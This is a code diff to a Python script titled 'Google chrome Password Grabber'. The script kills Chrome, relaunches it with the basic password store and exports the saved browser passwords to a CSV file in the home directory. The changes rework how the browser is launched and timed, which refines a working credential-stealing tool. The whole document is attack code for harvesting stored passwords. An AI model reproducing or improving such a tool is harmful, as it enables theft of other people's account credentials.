@@ -2,7 +2,7 @@
 
 import os
 import time
-import multiprocessing
+import subprocess
 
 
 def get_config_path():
@@ -19,10 +19,11 @@ def kill_chrome_processes():
 
 
 def open_chrome_with_basic_password_store():
-    print('Starting Chrome borser in basic store mode!')
     command = 'google-chrome --password-store=basic'
-    os.system(command)
-
+    p = subprocess.Popen(command, shell=True)
+    print('Starting Chrome browser in basic store mode!')
+    time.sleep(10)
+    p.terminate()
 
 def export_passwords_to_csv():
     print('Exporting passwords to Passwords.csv in home dir!')
@@ -33,18 +34,14 @@ def export_passwords_to_csv():
 if __name__ == '__main__':
     print('Google chrome Password Grabber')
 
+    os.system("export DBUS_SESSION_BUS_ADDRESS='unix:path=/run/user/1000/bus'")
     path = get_config_path()
 
     kill_chrome_processes()
 
-    p = multiprocessing.Process(target=open_chrome_with_basic_password_store, name='Google-Chrome')
-    p.start()
-    time.sleep(10)
-    p.terminate()
-    # p.join()
+    open_chrome_with_basic_password_store()
 
-    time.sleep(10)
-    kill_chrome_processes()
+    time.sleep(5)
+    # kill_chrome_processes()
 
-    time.sleep(10)
     export_passwords_to_csv()
